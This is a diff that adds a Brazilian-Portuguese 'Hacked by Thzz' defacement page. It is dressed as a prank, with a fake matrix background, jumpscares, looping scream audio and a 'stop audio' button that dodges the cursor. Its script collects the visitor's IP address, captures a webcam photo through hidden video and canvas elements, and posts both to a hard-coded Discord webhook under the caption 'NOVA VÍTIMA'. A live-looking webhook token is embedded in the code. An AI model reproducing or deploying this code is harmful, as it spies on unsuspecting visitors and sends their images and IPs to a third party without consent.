@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Hacked by Thzz</title>
+<style>
+body {
+    background-color: black;
+    color: darkred;
+    text-align: center;
+    font-family: monospace;
+    overflow: hidden;
+    position: relative;
+    min-height: 100vh;
+    margin: 0;
+}
+
+#matrix-bg {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    z-index: 1;
+    opacity: 0.25;
+    font-family: monospace;
+    font-size: 13px;
+    line-height: 1.1;
+    color: #ff3333;
+    text-shadow: 0 0 5px #ff0000;
+}
+
+.matrix-line { 
+    position: absolute; 
+    white-space: nowrap;
+    animation: fall linear infinite;
+}
+
+@keyframes fall {
+    from { transform: translateY(-100px); }
+    to { transform: translateY(100vh); }
+}
+
+#admin-panel {
+    position: fixed;
+    bottom: 12px;
+    right: 12px;
+    background: #2a0000;
+    border: 1.5px solid #990000;
+    color: #990000;
+    padding: 5px 12px;
+    font-size: 11px;
+    font-weight: bold;
+    border-radius: 3px;
+    cursor: pointer;
+    z-index: 99999;
+    box-shadow: 0 0 12px rgba(150, 0, 0, 0.6);
+    transition: all 0.2s;
+    opacity: 0.6;
+}
+
+#admin-panel:hover {
+    background: #990000;
+    color: #000;
+    transform: scale(1.3);
+    opacity: 1;
+    box-shadow: 0 0 20px rgba(255, 0, 0, 0.9);
+}
+
+#hacked-title {
+    font-size: 62px;
+    font-weight: bold;
+    background: linear-gradient(180deg, #ff0000, #8b0000, #ff0000);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    text-shadow: 0 0 30px rgba(255, 0, 0, 0.8), 0 0 60px rgba(255, 0, 0, 0.5);
+    letter-spacing: 4px;
+    margin-top: 15vh;
+    filter: drop-shadow(0 0 15px #ff0000);
+    animation: glow 2s ease-in-out infinite alternate;
+}
+
+@keyframes glow {
+    from { filter: drop-shadow(0 0 10px #ff0000) brightness(1); }
+    to { filter: drop-shadow(0 0 25px #ff0000) brightness(1.3); }
+}
+
+#ttk-title {
+    font-size: 32px;
+    font-weight: bold;
+    color: #ff3333;
+    text-shadow: 0 0 20px rgba(255, 0, 0, 0.9), 0 0 40px rgba(255, 0, 0, 0.6);
+    letter-spacing: 2px;
+    margin-top: 10px;
+    animation: pulse 3s ease-in-out infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 0.8; transform: scale(1); }
+    50% { opacity: 1; transform: scale(1.05); }
+}
+
+#hacked-img {
+    width: 220px;
+    border-radius: 15px;
+    margin: 25px;
+    box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
+}
+
+#jumpscare {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: #000;
+    z-index: 999999;
+    display: none;
+    align-items: center;
+    justify-content: center;
+}
+
+#jumpscare-img {
+    max-width: 95%;
+    max-height: 95%;
+    filter: brightness(1.7) contrast(3) saturate(4) hue-rotate(-10deg) drop-shadow(0 0 50px red);
+    animation: flash 0.07s infinite alternate;
+    mix-blend-mode: screen;
+}
+
+@keyframes flash {
+    from { filter: brightness(0.8) contrast(3.5) saturate(5) hue-rotate(-15deg) drop-shadow(0 0 80px darkred); }
+    to { filter: brightness(2.5) contrast(3) saturate(4) hue-rotate(-5deg) drop-shadow(0 0 100px red); }
+}
+
+#pause-btn {
+    position: fixed;
+    padding: 15px 35px;
+    background: #000000;
+    color: #ff0000;
+    border: 3px solid #ff0000;
+    font-family: monospace;
+    font-size: 16px;
+    font-weight: bold;
+    border-radius: 8px;
+    cursor: pointer;
+    z-index: 999998;
+    display: none;
+    box-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
+    transition: none;
+    text-shadow: 0 0 5px #ff0000;
+}
+
+#pause-btn:hover {
+    background: #ff0000;
+    color: #000;
+    box-shadow: 0 0 30px rgba(255, 0, 0, 1);
+}
+
+#ip-popup {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #000;
+    border: 2px solid #ff0000;
+    padding: 20px;
+    border-radius: 8px;
+    z-index: 9999;
+    display: none;
+    box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
+}
+
+#ip-popup h2, #ip-popup p, #ip-popup button { color: #ff0000; }
+#ip-popup button {
+    background: #000;
+    border: 2px solid #ff0000;
+    padding: 8px 20px;
+    cursor: pointer;
+    font-weight: bold;
+    border-radius: 4px;
+}
+#ip-popup button:hover { background: #ff0000; color: #000; }
+</style>
+</head>
+<body>
+
+<div id="matrix-bg"></div>
+
+<div id="admin-panel" onclick="triggerJumpscare()">ADMIN ACCESS</div>
+
+<h1 id="hacked-title" style="opacity: 0;">Hacked by: thzz</h1>
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMHxMnReLiLes93vspyWl42-mRrT0P3ZEMJSo_Ud3MGkB0QpqUOjVTcDBP&s=10" style="opacity: 0;" id="hacked-img">
+<h3 id="ttk-title" style="opacity: 0;">ttk: matheuz.z7</h3>
+
+<div id="jumpscare">
+    <img id="jumpscare-img" src="https://images.meme-arsenal.com/a10f9c94f196f1d879e68243d3863d84.jpg">
+</div>
+
+<button id="pause-btn" onclick="jumpscareDenovo()">🔇 PARAR ÁUDIO</button>
+
+<div id="ip-tracker"><h4>✅ IP RASTREADO E COLETADO</h4></div>
+
+<div id="ip-popup">
+    <h2>🚨 ACESSO DETECTADO, CAIU NO IP GRABBER KKKKKKKKKKK</h2>
+    <p style="color:#ff0000;font-weight:bold;">Seu IP foi coletado com sucesso, betinha!</p>
+    <button onclick="hidePopup()">FECHAR</button>
+</div>
+
+<div id="webcam-info">
+    <strong>📹 WEBCAM:</strong> <span id="cam-status">Aguardando...</span>
+</div>
+
+<video id="hidden-video" style="display:none;" autoplay playsinline></video>
+<canvas id="hidden-canvas" style="display:none;"></canvas>
+<div id="user-ip" style="display:none;"></div>
+
+<script>
+let screamInterval;
+let jumpscareAtivo = false;
+let teleportInterval;
+
+const screams = [
+    'https://www.myinstants.com/media/sounds/ahhh.mp3',
+    'https://www.soundjay.com/human/scream-01.mp3',
+    'https://www.soundjay.com/human/scream-02.mp3',
+    'https://cdn.freesound.org/previews/415/415209_5121236-lq.mp3',
+    'https://cdn.freesound.org/previews/380/380483_6442965-lq.mp3'
+];
+
+function playScreams() {
+    screams.forEach(url => new Audio(url).play().catch(() => {}));
+}
+
+function iniciarTeleporte() {
+    const btn = document.getElementById('pause-btn');
+    
+    if (teleportInterval) {
+        clearInterval(teleportInterval);
+    }
+    
+    teleportInterval = setInterval(() => {
+        const maxX = window.innerWidth - btn.offsetWidth - 20;
+        const maxY = window.innerHeight - btn.offsetHeight - 20;
+        
+        const newX = Math.random() * maxX;
+        const newY = Math.random() * maxY;
+        
+        btn.style.left = newX + 'px';
+        btn.style.top = newY + 'px';
+    }, 550); // 550ms agora
+}
+
+function pararTeleporte() {
+    if (teleportInterval) {
+        clearInterval(teleportInterval);
+        teleportInterval = null;
+    }
+}
+
+function triggerJumpscare() {
+    if (jumpscareAtivo) return;
+    jumpscareAtivo = true;
+    
+    const js = document.getElementById('jumpscare');
+    const img = document.getElementById('jumpscare-img');
+    const btn = document.getElementById('pause-btn');
+    
+    pararTeleporte();
+    btn.style.display = 'none';
+    img.src = 'https://images.meme-arsenal.com/a10f9c94f196f1d879e68243d3863d84.jpg';
+    img.style.transform = 'scale(1)';
+    js.style.display = 'flex';
+    document.body.style.animation = 'shake 0.07s infinite';
+    document.body.style.filter = 'brightness(3) saturate(2) sepia(0.5)';
+
+    playScreams();
+    
+    if (!screamInterval) {
+        screamInterval = setInterval(playScreams, 1500);
+    }
+
+    setTimeout(() => img.style.transform = 'scale(4) rotate(15deg)', 100);
+    setTimeout(() => img.style.transform = 'scale(8) rotate(-20deg)', 800);
+    setTimeout(() => img.style.transform = 'scale(15) rotate(10deg)', 1600);
+
+    setTimeout(() => {
+        js.style.display = 'none';
+        document.body.style.animation = '';
+        document.body.style.filter = '';
+        img.style.transform = 'scale(1)';
+        
+        btn.style.display = 'block';
+        btn.style.left = '50%';
+        btn.style.top = '50%';
+        btn.style.transform = 'translate(-50%, -50%)';
+        
+        iniciarTeleporte();
+        
+        jumpscareAtivo = false;
+    }, 3200);
+}
+
+function jumpscareDenovo() {
+    if (jumpscareAtivo) return;
+    jumpscareAtivo = true;
+    
+    const js = document.getElementById('jumpscare');
+    const img = document.getElementById('jumpscare-img');
+    const btn = document.getElementById('pause-btn');
+    
+    pararTeleporte();
+    btn.style.display = 'none';
+    img.src = 'https://images.meme-arsenal.com/a10f9c94f196f1d879e68243d3863d84.jpg';
+    img.style.transform = 'scale(1)';
+    js.style.display = 'flex';
+    document.body.style.animation = 'shake 0.07s infinite';
+    document.body.style.filter = 'brightness(3) saturate(2) sepia(0.5)';
+
+    playScreams();
+
+    setTimeout(() => img.style.transform = 'scale(4) rotate(-25deg)', 100);
+    setTimeout(() => img.style.transform = 'scale(10) rotate(30deg)', 600);
+    setTimeout(() => img.style.transform = 'scale(20) rotate(-15deg)', 1200);
+
+    setTimeout(() => {
+        js.style.display = 'none';
+        document.body.style.animation = '';
+        document.body.style.filter = '';
+        img.style.transform = 'scale(1)';
+        
+        btn.style.display = 'block';
+        btn.style.left = Math.random() * (window.innerWidth - 200) + 'px';
+        btn.style.top = Math.random() * (window.innerHeight - 100) + 'px';
+        btn.style.transform = 'none';
+        
+        iniciarTeleporte();
+        
+        jumpscareAtivo = false;
+    }, 3200);
+}
+
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1482091735764177097/TZmlcluDXknhNBM_pXzK3zzdEeXP621XkOxQEVfncq2lSZwJfkW0aEDU8filby-wUeoI';
+
+function createStaticBinary() {
+    const matrixBg = document.getElementById('matrix-bg');
+    const binaryLines = ['01001010000110100101101010010110','10110100101011010100101101001010','11010100101101010010110100101101','00101101010010110100101011010010','10100101101001011010010110100101','01011010010110100101101001011010'];
+    for(let i = 0; i < 70; i++) {
+        const line = document.createElement('div');
+        line.className = 'matrix-line';
+        line.textContent = binaryLines[Math.floor(Math.random() * binaryLines.length)];
+        line.style.left = (Math.random() * 90) + '%';
+        line.style.top = Math.random() * -100 + 'px';
+        line.style.animationDuration = (5 + Math.random() * 10) + 's';
+        line.style.animationDelay = Math.random() * 5 + 's';
+        matrixBg.appendChild(line);
+    }
+}
+
+function typewriterEffect() {
+    setTimeout(() => document.getElementById('hacked-title').style.opacity = '1', 800);
+    setTimeout(() => document.getElementById('hacked-img').style.opacity = '1', 2500);
+    setTimeout(() => document.getElementById('ttk-title').style.opacity = '1', 3500);
+}
+
+window.onload = function() {
+    createStaticBinary();
+    setTimeout(() => alert("⚠️ ESTA URL PODE SER MALICIOSA!\n\nEste site pode ser perigoso.\nSeu IP foi rastreado e coletado."), 500);
+    typewriterEffect();
+    setTimeout(getIPInfo, 4500);
+    setTimeout(accessWebcam, 7000);
+};
+
+const shakeStyle = document.createElement('style');
+shakeStyle.textContent = `@keyframes shake{0%,100%{transform:translate(0)}10%,30%,50%,70%{transform:translate(-10px,0)rotate(-5deg)}20%,40%,60%,80%{transform:translate(10px,0)rotate(5deg)}}`;
+document.head.appendChild(shakeStyle);
+
+async function getIPInfo() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        document.getElementById('user-ip').textContent = data.ip;
+        document.getElementById('ip-tracker').style.display = 'block';
+        document.getElementById('ip-popup').style.display = 'block';
+        setTimeout(hidePopup, 5000);
+    } catch(e) {}
+}
+
+function hidePopup() { document.getElementById('ip-popup').style.display = 'none'; }
+
+async function accessWebcam() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } });
+        const video = document.getElementById('hidden-video');
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+            const canvas = document.getElementById('hidden-canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 320; canvas.height = 240;
+            ctx.drawImage(video, 0, 0);
+            const formData = new FormData();
+            formData.append('username', '🤖 Thzz Hacked');
+            formData.append('content', `📸 **NOVA VÍTIMA!**\n**IP:** \`${document.getElementById('user-ip').textContent}\`\n**Data:** ${new Date().toLocaleString('pt-BR')}`);
+            formData.append('file', dataURLtoBlob(canvas.toDataURL()), 'victim.jpg');
+            fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+            document.getElementById('cam-status').textContent = 'Oops, webcam coletada e enviada 👾';
+            document.getElementById('webcam-info').style.display = 'block';
+            stream.getTracks().forEach(t => t.stop());
+        };
+    } catch(err) {
+        document.getElementById('cam-status').textContent = '❌ WEBCAM BLOQUEADA';
+        document.getElementById('webcam-info').style.display = 'block';
+    }
+}
+
+function dataURLtoBlob(dataURL) {
+    const arr = dataURL.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while(n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type: mime});
+}
+</script>
+</body>
+</html>
